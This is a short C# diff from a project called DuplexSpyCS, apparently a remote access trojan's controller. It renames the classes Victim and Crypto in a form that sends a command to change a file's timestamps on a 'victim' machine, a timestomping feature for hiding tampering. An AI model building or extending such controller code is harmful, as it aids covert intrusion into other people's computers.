@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFileDatetime : Form
     {
-        private Victim v;
+        private clsVictim v;
         private string m_szCurrentPath;
         private string m_szFilename;
         private bool m_bIsFile;
@@ -24,7 +24,7 @@ namespace DuplexSpyCS
             LastAccessedTime,
         }
 
-        public frmFileDatetime(Victim v, string szCurrentPath, string szFilename, bool bFile)
+        public frmFileDatetime(clsVictim v, string szCurrentPath, string szFilename, bool bFile)
         {
             InitializeComponent();
 
@@ -64,7 +64,7 @@ namespace DuplexSpyCS
 
             Task.Run(() =>
             {
-                v.SendCommand($"File|ts|{szIsFile}|{Crypto.b64E2Str(szFilePath)}|{nType}|{Crypto.b64E2Str(szDatetme)}");
+                v.SendCommand($"File|ts|{szIsFile}|{clsCrypto.b64E2Str(szFilePath)}|{nType}|{clsCrypto.b64E2Str(szDatetme)}");
             });
         }
     }
